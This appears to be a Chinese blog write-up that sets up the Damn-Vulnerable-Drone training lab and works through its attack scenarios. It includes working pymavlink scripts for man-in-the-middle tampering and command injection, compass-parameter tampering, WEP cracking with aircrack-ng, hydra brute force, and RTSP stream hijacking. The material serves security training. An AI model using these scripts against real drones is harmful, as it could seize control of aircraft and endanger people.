---
title: "Damn-Vulnerable-Drone靶场"
date: 2026-09-09
categories: ["网络攻防"]
tags: ["低空经济", "无人机安全"]
description: "【低空经济安全】构建无人机安全研究靶场（湾区杯赛道一备赛）"
draft: false
---

## 项目地址

https://github.com/nicholasaleks/Damn-Vulnerable-Drone

基于流行的ArduPilot/MAVLink架构的有意设计漏洞的无人机黑客模拟器

系统配置：

我是直接放在wsl的ubuntu系统里面拉的docker

![1](../../drone/media/1.png)

## 1、基础环境准备：docker

```bash
# 首先，更新一下系统的软件包列表
sudo apt update
 
# 安装一些必要的工具，比如curl和证书
sudo apt install -y apt-transport-https ca-certificates curl software-properties-common gnupg lsb-release
 
# 添加Docker的官方GPG密钥，确保我们下载的软件是正版且未被篡改的
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
 
# 将Docker的稳定版仓库添加到我们的系统源列表里
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
 
# 再次更新软件源，这次就能看到Docker的仓库了
sudo apt update
 
# 安装Docker引擎（包含docker-ce, docker-ce-cli等）和Docker Compose插件
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin
 
# 安装完成后，启动Docker服务，并设置成开机自启
sudo systemctl enable docker --now
```

![2](../../drone/media/2.png)

## 2、获取并启动Damn-Vulnerable-Drone

```bash
# 克隆项目仓库到当前目录
git clone https://github.com/nicholasaleks/Damn-Vulnerable-Drone.git
 
# 进入项目文件夹
cd Damn-Vulnerable-Drone

# 查看启动脚本的帮助信息
sudo ./start.sh -h
```

![3](../../drone/media/3.png)

能看到类似这样的输出

这里有两个核心启动模式：--wifi和--no-wifi。我强烈建议第一次运行时使用--no-wifi模式，因为它更简单直接。

    --no-wifi模式（默认）：这个模式下，模拟无人机的所有网络服务（比如Web管理界面、模拟的摄像头视频流）会直接绑定到你主机的网络接口上。你就像用一根网线直接连上了无人机，可以直接用浏览器访问它的IP地址。这对于快速上手和调试非常方便。
    --wifi模式：这个模式会创建一个虚拟的Wi-Fi网络接口（比如dvd-wlan0），模拟无人机发出的真实Wi-Fi信号。你需要像连接一个真实无人机Wi-Fi热点一样，手动让你的攻击机（可能是另一个虚拟机或主机上的无线网卡）去连接这个网络。这更贴近真实的无线渗透测试场景，但设置稍复杂。
可以先从简单的方式开始

## 3、访问管理web平台

使用默认模式启动：

``` bash
# 使用默认（无虚拟Wi-Fi）模式启动靶场
sudo ./start.sh --no-wifi
```

![1789022216119](../../drone/media/1789022216119.png)

这里可以选择是否3D，可以根据硬件条件选：

WSL2 的 GPU 支持需要通过**特殊的 Windows 驱动**来实现，而不是在 Ubuntu 里安装显卡驱动。按下面的步骤来配置：

1. 安装 WSL 专用驱动**：你需要从 NVIDIA 官网下载并安装 **WSL 专用的 Windows 显卡驱动**。这个驱动会提供一个虚拟 GPU 给 WSL2，这是启用 GPU 加速的前提。安装完成后，在 Windows PowerShell 中输入 `nvidia-smi` 应该能正常显示显卡信息。
2. **在 Ubuntu 内验证**：安装好 Windows 驱动后，在 WSL 的 Ubuntu 终端里输入 `nvidia-smi`，如果能看到显卡信息，就说明 WSL2 已经成功识别到显卡了。**注意**：在 Ubuntu 里**不要**再安装任何 Linux 显卡驱动，否则可能会引发冲突。
3. **安装 CUDA 工具包**：验证通过后，你就可以在 Ubuntu 里安装 CUDA Toolkit 了。关键是，要安装 NVIDIA 官方为 WSL 提供的 **cuda-toolkit**，而不是普通的 `cuda` 包，后者可能会错误地安装 Linux 驱动。
4. **让 Docker 也能用上 GPU（可选）**：如果你打算在 WSL2 里通过 Docker 运行靶场，并希望容器也能访问 GPU，可以用 `--gpus all` 参数来运行容器。这意味着 Docker Desktop 需要配置为使用 WSL2 后端，并确保 Windows 驱动已正确安装。

这里真的安装蛮久的，要拉好几个镜像出来，并创建和配置容器网络，所以我建议两边同时进行

最后出来这样的页面，说明启动成功了，可以本地访问，`http://localhost:8080`，就能看到Damn-Vulnerable-Drone的**管理Web控制台**，该平台有选择不同的漏洞场景、控制无人机起飞降落、查看状态等

![1789036190422](../../drone/media/1789036190422.png)

### 全3D模式接口

![1789036224831](../../drone/media/1789036224831.png)

这样就搭建成功了，真的蛮有意思的这个场景

## 4、漏洞靶场测试

这是github主页给的几个攻击场景，可以复现一下

![1789022956942](../../drone/media/1789022956942.png)

## （1）容器信息

![1789045886930](../../drone/media/1789045886930.png)

| 容器名称 (示例)            | 模拟角色                    | 主要功能与访问方式                                           |
| -------------------------- | --------------------------- | ------------------------------------------------------------ |
| `dvd_ardupilot-sitl_1`     | 飞行控制器 (ArduPilot SITL) | 模拟无人机的“大脑”，通过UDP端口5760和5762接收发送MAVLink消息。 |
| `dvd_mavlink-router_1`     | MAVLink 路由器              | 负责在飞控、配套计算机和地面站之间转发MAVLink数据流。        |
| `dvd_companion-computer_1` | 机载配套计算机              | 运行一个Web界面（通常位于`http://localhost:8080`），模拟机载计算单元，负责视频流、任务规划等。 |
| `dvd_rtsp-simulator_1`     | 机载摄像头                  | 模拟一个RTSP视频流服务器，提供虚拟的无人机航拍画面。         |
| `dvd_qgroundcontrol_1`     | 地面控制站 (QGC)            | 提供完整的QGroundControl界面，用于监控和控制无人机（仅x86架构可用）。 |

## （2）飞行状态

#####  8000端口问题排查

这里我发现无法打开8000端口，然后去排查了一下

发现：Windows 上的 NVIDIA 软件占用了 8000 端口。
 DVD 管理控制台本身完全正常：在 WSL 内 curl http://localhost:8000/ 返回 HTTP 200（0.18s）。
但 Windows 侧的 8000 端口被 NVIDIA App 抢占了：
integrations.exe (PID 15040)  ←  NVIDIA App 的组件
   └ 父进程 supervisor.exe (PID 7952)
​        └ NvContainerLocalSystem 服务（NVIDIA App）
进程链：services.exe → supervisor.exe → integrations.exe，还有同级的 nvfvsdksvc_x64.exe（NVIDIA FrameView SDK），确认是 NVIDIA App。它监听 0.0.0.0:8000（IPv4），导致 WSL2 无法把容器里的 8000 转发到 Windows。

##### 改端口映射到 8001

临时改动：

```bash
#新建了一个临时 override 文件
cat > ~/dvd-port-override.yaml <<'EOF'
services:
  simulator:
    ports:
      - "8080:8080"
      - "8001:8000"
EOF

# 2. 只重建 simulator 容器
docker compose -f /tools/Damn-Vulnerable-Drone/docker-compose.yaml -f ~/dvd-port-override.yaml up -d simulator

# 3. 等约 20 秒让 mgmt 起来，然后浏览器打开 http://localhost:8001/

```

永久改动：

```bash
# 1. 把端口映射永久改成 8001（docker-compose.yaml 是 root 属主）
sudo sed -i 's/"8000:8000"/"8001:8000"/' /tools/Damn-Vulnerable-Drone/docker-compose.yaml

# 2. 确认改对了（应显示 8001:8000，且 8080 不变）
grep -n '8000\|8001' /tools/Damn-Vulnerable-Drone/docker-compose.yaml

# 3. 删掉临时 override，避免重复映射
rm -f ~/dvd-port-override.yaml

# 4. 应用
docker compose -f /tools/Damn-Vulnerable-Drone/docker-compose.yaml up -d simulator

#之后无论用 ./start.sh 还是 docker compose up，控制台都会固定走 http://localhost:8001/，8080 的 GzWeb 3D 视图不变。
```



这个模拟器有多种飞行状态。每个飞行状态都可以通过点击UI中的按钮触发（[http://localhost:8000](http://localhost:8000/)）。模拟这些不同飞行状态的能力使用户能够测试和利用无人机操作的不同方面。点击这些状态，实际上是在触发GCS向无人机下达指令。

真的蛮好玩的哈哈哈哈哈哈

![1789050337079](../../drone/media/1789050337079.png)

玩得我爱不释手的，我去，真能飞起来，天才真是天才

![1789050573640](../../drone/media/1789050573640.png)

小东西还飞蛮高，小瞧你了（好笑吗，我只看到了一个绝望的地控）

![1789050635117](../../drone/media/1789050635117.png)

| 按钮文字              | 按钮 id     | 后端接口       | 触发内容                                                   |
| --------------------- | ----------- | -------------- | ---------------------------------------------------------- |
| Initial Boot          | `stage1`    | `POST /stage1` | 启动 SITL(sim_vehicle.py ArduCopter) + MAVLink Router 遥测 |
| Arm & Take-Off        | `stage2`    | `POST /stage2` | GUIDED 模式 → 解锁 → 起飞 2.75m                            |
| Autopilot Flight      | `stage3`    | `POST /stage3` | 上传圆形航线 waypoints → 切 AUTO 模式                      |
| Emergency/RTH Landing | `stage4`    | `POST /stage4` | 设 RTL 高度 → 切 RTL 返航降落                              |
| Post-Flight Analysis  | `stage5`    | `POST /stage5` | 飞行后日志/数据分析，阶段回滚                              |
| Reset                 | `reset-sim` | `POST /reset`  | 杀掉 SITL、清日志、恢复初始状态                            |

## （3）地面控制

启动QGround Control（QGround控制）

QGroundControl 是一款开源地面控制站（GCS）软件，允许用户规划、控制和监控无人机（UAV）。它提供实时飞行数据、任务规划以及管理无人机操作的直观界面。

点击模拟器侧边导航栏上的“启动QGroundControl”按钮

![1789050947634](../../drone/media/1789050947634.png)

在左下角这里，小车车旁边

QGroundControl用于任务规划、无人机配置、实时监控和数据分析。用户可以创建飞行路径、调整无人机设置，并在飞行中监控遥测数据。它支持多种无人机平台，并为安全高效的无人机操作提供工具。

![1789051051900](../../drone/media/1789051051900.png)

长这样，好有意思

可以先nmap扫扫看的，嘿嘿

### 主机发现：

![1789057746747](../../drone/media/1789057746747.png)

### MAVLink 端口扫描

![1789057796044](../../drone/media/1789057796044.png)

## 4.1场景一：MAVLink-Injection-Attack 

### MAVLink通信中间人攻击

核心：**重定向数据流**

MAVLink路由器（`mavlink-router`）负责在飞控（端口5760）、配套计算机和QGroundControl之间转发消息

MAVLink注入攻击涉及拦截并注入恶意MAVLink消息，进入无人机与地面控制站之间的通信中。这可以用来改变无人机的行为——包括改变飞行模式、发出命令覆盖、注入遥测数据或重新定向导航。

MAVLink 是一种轻量级消息协议，大多数现代无人机使用，在许多系统中缺乏身份验证或消息签名，因此容易被注入。

##### 第一步、先理解网络拓扑

```bash
docker network ls
docker network inspect [name or id]
```

![1789046770283](../../drone/media/1789046770283.png)

![1789046843440](../../drone/media/1789046843440.png)

这个simulator是重点，**连接的容器：**

| 容器名                 | IPv4 地址      | MAC               | 说明                       |
| :--------------------- | -------------- | ----------------- | -------------------------- |
| flight-controller      | `10.13.0.2/24` | 52:6a:1c:33:5c:b9 | 飞行控制器(ArduPilot SITL) |
| companion-computer     | `10.13.0.3/24` | 1e:11:17:19:22:5c | 机载配套计算机             |
| ground-control-station | `10.13.0.4/24` | b2:18:64:aa:c1:42 | 地面控制站 (QGC)           |
| simulator              | `10.13.0.5/24` | 9a:48:e2:77:76:d2 | 机载摄像头                 |

确定飞控SITL的地址是**10.13.0.2**，监听端口要具体去看（通常是 `5760` 或 `14550`）

```bash
# 进入 flight-controller 容器
docker exec -it flight-controller /bin/bash

# 在容器内执行，查看所有 TCP/UDP 监听端口
netstat -tulpen

# 或者如果系统支持，可以用更现代的 ss 命令
ss -tulpen
```

###### 飞控 (arducopter, PID 98) 的监听端口

| 协议 | 监听地址     | 端口     | 用途                        |
| ---- | ------------ | -------- | --------------------------- |
| TCP  | `0.0.0.0`    | **5762** | MAVLink 主连接（对外）      |
| TCP  | `0.0.0.0`    | **5763** | MAVLink 第二连接（对外）    |
| UDP  | `0.0.0.0`    | **9003** | 对外 UDP MAVLink            |
| UDP  | `0.0.0.0`    | **5501** | 对外 UDP MAVLink            |
| UDP  | `127.0.0.1`  | 9005     | 本机内部使用，外部连不上    |
| TCP  | `127.0.0.11` | 33091    | Docker 内置 DNS（不是飞控） |
| UDP  | `127.0.0.11` | 49425    | Docker 内置 DNS（不是飞控） |

##### 第二步、安装MAVProxy

```bash
sudo apt-get install python3-dev python3-opencv python3-wxgtk4.0 \
python3-pip python3-matplotlib python3-lxml python3-pygame

pip3 install PyYAML mavproxy --user
echo 'export PATH="$PATH:$HOME/.local/bin"' >> ~/.bashrc
```

##### 第三步、连接到无人机

根据你的设置，使用以下方法之一：

**TCP：**

```bash
mavproxy.py --master=/dev/ttyUSB0 --baudrate 57600 --aircraft MyAircraft
```

**UDP：**

```bash
mavproxy.py --master=udp:127.0.0.1:14550
```

##### 第四步、设置转发以注入消息

```bash
mavproxy.py --master=udp:127.0.0.1:14550 --out=udp:127.0.0.1:14551
```

这使得MAVProxy能够将注入的命令从另一个端口转发到实时无人机连接。

![1789053104698](../../drone/media/1789053104698.png)

![1789054056368](../../drone/media/1789054056368.png)

##### 第五步、使用 pymavlink 注入 MAVLink 消息

激活虚拟环境

```bash
python3 -m venv ~/mavproxy-venv
source ~/mavproxy-venv/bin/activate 
```

将此示例脚本保存为：`inject_mode_change.py`

```python
from pymavlink import mavutil

# Connect to the forwarding port
master = mavutil.mavlink_connection('udp:127.0.0.1:14550')
master.wait_heartbeat()
print("[+] Connected to drone")

# Change mode using COMMAND_LONG
master.mav.command_long_send(
    1, 1,  # target system, target component
    mavutil.mavlink.MAV_CMD_DO_SET_MODE,
    0,
    1, 0, 4,  # param1: base_mode=1, param2: unused, param3: custom_mode=4 (GUIDED)
    0, 0, 0, 0
)

print("[!] Sent mode change command")
```

##### 一键化POC 

这个脚本运行后，所有经过的MAVLink消息都会流经你的攻击主机。通过分析`RC_CHANNELS_OVERRIDE`、`COMMAND_LONG`等消息，你可以清晰地看到操作员发出的每一个指令。而更危险的在于`modify`逻辑被激活时，你可以实时篡改这些指令，例如将“上升”改为“下降”，将“返航”改为“向远处飞行”。

```python
from pymavlink import mavutil
import threading
import time

# 攻击脚本的配置
FC_ADDR = ('172.18.0.2', 5762)   # 飞控地址
GCS_ADDR = ('172.18.0.3', 14550) # 地面站地址

def forward_messages(source_conn, dest_conn, src_name, dst_name, modify=False):
    """从一个连接读取消息并转发到另一个连接，可选择修改。"""
    while True:
        try:
            msg = source_conn.recv_match(blocking=True, timeout=1)
        except Exception as e:
            print(f"[-] 读取 {src_name} 出错: {e}")
            break

        if msg is None:
            continue

        # 攻击逻辑核心：检查并可能篡改消息
        if msg.get_type() == 'HEARTBEAT' and modify:
            print(f"[*] 截获来自 {src_name} 的心跳包")
            # 例如可以篡改系统状态，伪造错误
            # msg.system_status = mavutil.mavlink.MAV_STATE_CRITICAL
            pass

        # 特别关注 RC_CHANNELS_OVERRIDE 消息（手动控制指令）
        if msg.get_type() == 'RC_CHANNELS_OVERRIDE':
            print(f"[!] 截获遥控器覆盖指令: 横滚={msg.chan1_raw}, 俯仰={msg.chan2_raw}")
            if modify:
                # 以中位 1500 为基准反转俯仰通道，保持中位不变
                msg.chan2_raw = 3000 - msg.chan2_raw
                print(f"[ATTACK] 已篡改俯仰通道指令为: {msg.chan2_raw}")

        # 将（可能被修改的）消息转发到目标
        dest_conn.mav.send(msg)
        print(f"[>] {src_name} -> {dst_name}: {msg.get_type()}")

# 建立到飞控的连接（冒充 GCS，主动连接飞控）
print("[+] 连接到飞控...")
fc_conn = mavutil.mavlink_connection(f'tcp:{FC_ADDR[0]}:{FC_ADDR[1]}')

# 建立到地面站的连接（冒充飞控，主动连接 GCS）
print("[+] 连接到地面站...")
gcs_conn = mavutil.mavlink_connection(f'tcp:{GCS_ADDR[0]}:{GCS_ADDR[1]}')

# 启动两个转发线程
print("[*] 启动中间人转发...")
thread_fc_to_gcs = threading.Thread(
    target=forward_messages,
    args=(fc_conn, gcs_conn, 'FC', 'GCS', True)   # 飞控 -> 地面站，开启篡改
)
thread_gcs_to_fc = threading.Thread(
    target=forward_messages,
    args=(gcs_conn, fc_conn, 'GCS', 'FC', False)  # 地面站 -> 飞控，不篡改
)

thread_fc_to_gcs.daemon = True
thread_gcs_to_fc.daemon = True
thread_fc_to_gcs.start()
thread_gcs_to_fc.start()

thread_fc_to_gcs.join()
thread_gcs_to_fc.join()
```

![1789054897573](../../drone/media/1789054897573.png)你可以用这种方法向无人机的消息流注入任意的MAVLink命令，例如：

- 切换为引导模式或滞留模式
- 触发返回发射（RTL）
- 注入伪装遥测数据（例如GPS、电池）
- 飞行中发送或指令`MISSION_ITEM``SET_POSITION_TARGET_GLOBAL_INT`
- ![1789055606976](../../drone/media/1789055606976.png)

## 4.2 场景二：Wifi Analysis & Cracking    

### WiFi分析与破解（这个做不了，缺网卡）

##### 第一步、启动Airodump-ng

使用（已处于监控模式）捕获信标帧以识别目标网络：`wlan0mon`

注意：无人机配置为使用mac80211_hwsim内核模块。该模块创建虚拟无线接口，可用于模拟无线网络。此场景中使用的虚拟无线接口为`wlan0mon`。然而，在实际场景中，需要使用支持监控模式的无线硬件接口。

下面说一下大致流程：

```
sudo airodump-ng wlan0mon
```

应该会看到一个名为`Drone_Wifi`的网络 SSID，使用`WEP`加密方式运行，频道号`6`，BSSID 为 `02:00:00:00:01:00`。

记录这些参数，在后续步骤中使用。

注意：如果你的网卡未处于监控模式，可以使用以下命令启用它。

```
sudo ip link set wlan0 down
sudo iw wlan0 set type monitor
sudo ip link set wlan0 up
```

或者，你也可以使用 airmon-ng 工具在网络卡上启用监控模式。然而，这可能会项目网络，因为它需要终止wpa_supplicant和其他网络工具等进程。因此，你可能需要重启。

```
sudo airmon-ng start wlan0
```

##### 第二步、捕获无线流量

开始在第6通道捕获数据包，重点关注目标BSSID并保存为文件：

```
sudo airodump-ng -c 6 --bssid 02:00:00:00:01:00 -w capture wlan0mon
```

注意，现在可以点击“初始启动”飞行阶段，模拟无人机启动并连接网络。这将产生一些流量，可以被捕获和分析。这些数据包包含可用于破解WEP密钥的IV（初始化向量）。我们的目标是尽可能多地捕获这些数据包，以提高破解WEP密钥的机会。

正如我们所见，现在有几个数据包正在被捕获。这是无人机连接的好迹象。我们还能看到一个STATION地址，它是一个连接到网络的WiFi客户端。我们也记下这个客户的地址。`02:00:00:00:02:00``Drone_Wifi`

在我们用捕获的数据破解WEP密钥之前，需要先产生更多流量。我们可以通过使用 aireplay-ng 工具发起 ARP 回放攻击来实现这一点。

注意：破解WEP密钥大约需要50,000个数据包。这可以通过等待几分钟来实现，或者我们可以通过运行以下命令几分钟来加快进程。

##### 第三步、ARP回放攻击

打开新的终端窗口。接下来，执行ARP重放攻击以增加破解所需的初始化向量（IV）数量：

```
sudo aireplay-ng --arpreplay -b 02:00:00:00:01:00 -h 02:00:00:00:02:00 wlan0mon
```

收集到足够的IV后，我们可以取消aireplay和airodump进程，继续使用aircrack-ng工具和新的capture-01.cap文件破解WEP密钥。

##### 第四步、破解Wi-Fi密钥

利用捕获的数据包破解Wi-Fi密码：

```
 sudo aircrack-ng capture-01.cap
```

我们先记下WEP密钥`1234567890`，因为我们需要它来连接网络。

##### 第五步、连接Drone_Wifi网络

请使用以下命令使用 wlan3 接口连接网络：`Drone_Wifi`

```
nmcli dev wifi connect "Drone_Wifi" password "1234567890"
```

如果一切顺利，你现在应该已经连接到网络了。你可以用下面的命令验证你的wlan3接口是否已连接到网络。`Drone_Wifi`

```
ifconfig wlan3
```

恭喜你！你已经成功破解了WEP密钥并连接到了网络。我们的wlan3接口已经分配了一个IP地址，现在可以与无人机网络交互。`Drone_Wifi``192.168.13.10`

##### 替代方案——查找笔记本电脑便签

获取网络Wi-Fi密码的另一种方法是找到地面控制站笔记本电脑上的便利贴。这张便签里有网络密码：`Drone_Wifi`

## 4.3 场景三：Camera Feed Eavesdropping

### RTSP视频流劫持与欺骗

#### 第一步 安装

如果你的Kali系统还没有安装，那就安装吧。`ffplay`（这是套件之一）

```
sudo apt install ffmpeg
```

#### 第二步 nmap识别

使用 Nmap 识别无人机暴露的 RTSP 流。

```
nmap 10.13.0.3 --script rtsp*
```

你应该会看到类似的输出：

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 20:39 EDT
Nmap scan report for 10.13.0.3
Host is up (0.000092s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
554/tcp  open  rtsp
|_rtsp-methods: OPTIONS, DESCRIBE, ANNOUNCE, GET_PARAMETER, PAUSE, PLAY, RECORD, SETUP, SET_PARAMETER, TEARDOWN
| rtsp-url-brute: 
|   discovered: 
|_    rtsp://10.13.0.3/stream1
3000/tcp open  ppp
```

![1789055984586](../../drone/media/1789055984586.png)

#### 第三步 连接查看

用来连接并查看无人机的视频流。`ffplay`

```
ffplay rtsp://10.13.0.3:554/stream1
```

![1789056010269](../../drone/media/1789056010269.png)

这个好神奇，好好玩嘿嘿，自信到已经想去黑无人机了（哈哈哈哈哈）

#### 第四步 实施流劫持与虚假流注入【高级】

想象一个场景：操作员通过地面站屏幕观察无人机传回的实时画面，并据此做出飞行决策。如果攻击者能够用自己的视频流替换掉真实的流，就可以诱导操作员做出错误判断，例如让无人机飞向障碍物。

在DVD环境中，我们可以模拟这个过程：

1. **准备一个虚假视频文件**：可以是一段循环播放的、看似正常的机场跑道视频，但实际上视频中被植入了不存在的障碍物或错误的降落标志。
2. **搭建一个恶意的RTSP服务器**：使用`Live55`、`Mediamtx`（原rtsp-simple-server）等工具，将准备好的虚假视频以RTSP流的形式发布出来。
3. **重定向客户端的请求**：这是攻击的关键。我们需要通过ARP欺骗或修改网络路由，使得地面站软件（或配套计算机）在请求视频流时，被引导到我们的恶意RTSP服务器，而非真正的机载摄像头服务器。

以下是一个使用简易Python脚本结合`ffmpeg`模拟生成动态虚假流的例子，它生成一个带有移动红色警告框的测试图案：

```bash
# 使用ffmpeg生成一个动态测试流，并通过RTSP服务器发布
ffmpeg -re -f lavfi -i "testsrc=size=1280x720:rate=30, drawtext=text='[FAKE] GPS Signal Lost':fontcolor=red:fontsize=30:x=(w-text_w)/2:y=(h-text_h)/2" -c:v libx264 -preset ultrafast -tune zerolatency -f rtsp rtsp://10.13.0.3:554/stream1
```

尝试推流到这个上面发现不行，因为角色不对：：：

TSP 服务器一般分为两种角色：

1. **推流接收服务器**（如 MediaMTX、ZLMediaKit、SRS）：专门设计用来接收 `ANNOUNCE` 推流，并分发给播放客户端。这类服务器通常默认监听 8554 等端口。
2. **拉流代理服务器**（如 Live555ProxyServer）：设计用途是从其他 RTSP 源拉流并转发，它本身不接收推流，因此会拒绝 `ANNOUNCE` 方法。

![1789056358553](../../drone/media/1789056358553.png)同时，你需要运行一个RTSP服务器（如Mediamtx）来承载这个流。然后，在DVD的网络环境中，通过工具如`ettercap`进行ARP欺骗，将目标（地面站容器）对真实RTSP服务器IP的请求，重定向到你的攻击主机IP。

## 4.4  场景四：Companion Computer Takeover

### 配套计算机Web界面漏洞利用【这个可以搭配常见web漏洞】

这里要把3000端口run 起来的

真实场景还是会遇到很多问题的：

![1789058402204](../../drone/media/1789058402204.png)

![1789058640984](../../drone/media/1789058640984.png)

找出可以通过伴随电脑做出的改动，例如：

```bash
curl -X POST "http://localhost:3333/telemetry/stop-telemetry"
```

这导致遥测中断，导致地面控制站失去通信。

![1789056748834](../../drone/media/1789056748834.png)

## 4.5 场景五：Companion Computer Web UI Login Brute Force

### 伴随电脑网页界面登录暴力破解

#### 第一步、安装hydra

sudo apt-get install hydra

大多数 Kali Linux 镜像默认已包含 Hydra。

#### 第二步、识别登录表单

在浏览器中打开 [http://localhost:3333](http://localhost:3333)。使用DevTools（右键点击→检查→网络标签）查找：

- 登录表单的POST端点（例如，`/login`)
- 形式字段名称（例如， ，`username``password`)
- 表示登录失败的响应字符串（例如，“凭证无效”）

#### 第三步、准备你的单词表

你可以使用Damn Vulnerable Drone内置的密码列表：

```
https://github.com/nicholasaleks/Damn-Vulnerable-Drone/tree/master/simulator/mgmt/templates/pages/attacks/injection/passwords.txt
```

下载或使用你自己的自定义词表。

#### 第四步、发动九头蛇攻击

假设用户名是，密码列表是：`admin` `passwords.txt`

```
hydra -l admin -P passwords.txt http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid" -s 3000
```

- `-l`设置用户名
- `-P`指定密码列表
- `http-post-form`针对登录路由
- `:Invalid`告诉九头蛇哪个字符串表示登录失败

#### 第五步、查看结果

如果成功，九头蛇将展示破解的凭证：

```
[3000][http-post-form] host: localhost   login: admin   password: cyberdrone
```

你现在可以用恢复的凭证登录伴随电脑网页界面。

![1789058812574](../../drone/media/1789058812574.png)

![1789058877064](../../drone/media/1789058877064.png)

这里也可以看到wifi密码

## 4.6 	场景六：飞行参数篡改与传感器欺骗

#### 理解MAVLink参数协议

ArduPilot通过`PARAM_VALUE`、`PARAM_SET`、`PARAM_REQUEST_READ`等MAVLink消息来管理成千上万个飞行参数。在DVD中，我们可以通过MAVLink连接，直接读取和修改这些参数。

首先，我们需要连接到飞控的MAVLink端口，并请求参数列表：

```python
from pymavlink import mavutil

# 连接到飞控
connection = mavutil.mavlink_connection('tcp:10.13.0.2:5760')

# 等待心跳包，确认连接
connection.wait_heartbeat()
print("已连接到飞控")

# 请求获取所有参数（这是一个多步过程）
connection.mav.param_request_list_send(
    connection.target_system,
    connection.target_component
)

# 循环接收参数消息
params = {}
while True:
    msg = connection.recv_match(type=['PARAM_VALUE'], blocking=True, timeout=5)
    if msg is None:
        break
    params[msg.param_id.decode('utf-8').rstrip('\x00')] = msg.param_value
    print(f"参数: {msg.param_id} = {msg.param_value}")

print(f"共收到 {len(params)} 个参数")

```

会看到一个庞大的参数列表，从`AHRS_EKF_TYPE`（滤波器类型）到`WPNAV_SPEED`（航点导航速度），应有尽有。

#### 实施关键参数篡改攻击

现在，让我们尝试篡改一个关键参数，观察无人机的行为变化。例如，`COMPASS_OFS_X`、`COMPASS_OFS_Y`、`COMPASS_OFS_Z`是磁罗盘的偏移量参数。篡改它们可以导致飞控对方向的判断完全错误。

```python
# 假设我们要篡改COMPASS_OFS_X参数
target_param = 'COMPASS_OFS_X'
new_value = 500.0  # 设置一个明显异常的偏移值

# 发送参数设置消息
connection.mav.param_set_send(
    connection.target_system,
    connection.target_component,
    target_param.encode('utf-8'),
    new_value,
    mavutil.mavlink.MAV_PARAM_TYPE_REAL32
)

print(f"[ATTACK] 尝试将参数 {target_param} 设置为 {new_value}")

# 等待并确认参数已更改
while True:
    msg = connection.recv_match(type=['PARAM_VALUE'], blocking=True, timeout=3)
    if msg and msg.param_id.decode('utf-8').rstrip('\x00') == target_param:
        print(f"确认参数已更新: {msg.param_id} = {msg.param_value}")
        break
```

在QGroundControl中，你可以立刻看到对应参数值的变化。如果此时无人机正在飞行（在SITL模拟中），错误的磁罗盘数据可能会导致它无法保持航向，甚至开始原地旋转。这演示了通过MAVLink信道进行非物理接触式攻击的威力。

更复杂的传感器欺骗，如GPS欺骗，需要生成符合MAVLink `GPS_RAW_INT`消息格式的虚假数据包，并持续、连贯地注入到数据流中，以模拟一个移动的轨迹。这在DVD环境中同样可以模拟，你需要编写脚本持续发送带有虚假经纬度、高度和速度信息的MAVLink消息，并确保其序列号和时间戳的连续性，以骗过飞控的校验逻辑。

## 4.7 流量包分析（又回到取证了哈哈哈，无人机流量取证）

应用以下滤波器以隔离重要的遥测消息类型：

心跳（ID #0）

```
(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "HEARTBEAT")
```

SYS_STATUS（编号#1）

```
(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "SYS_STATUS")
```

GPS_RAW_INT（编号#24）

```
(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "GPS_RAW_INT")
```

GLOBAL_POSITION_INT（编号#33）

```
(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "GLOBAL_POSITION_INT")
```

ATTITUDE（ID #30）

```
(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "ATTITUDE")
```

海拔（ID #141）

```
(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "ALTITUDE")
```

BATTERY_STATUS（编号#147）

```
(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "BATTERY_STATUS")
```

VFR_HUD（编号#74）

```
(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "VFR_HUD")
```

状态文本（ID #253）

```
(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "STATUSTEXT")
```

MISSION_CURRENT（编号#42）

```
(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "MISSION_CURRENT")
```

NAV_CONTROLLER_OUTPUT（编号#62）

```
(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "NAV_CONTROLLER_OUTPUT")
```

RADIO_STATUS（编号#109）

```
(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "RADIO_STATUS")
```

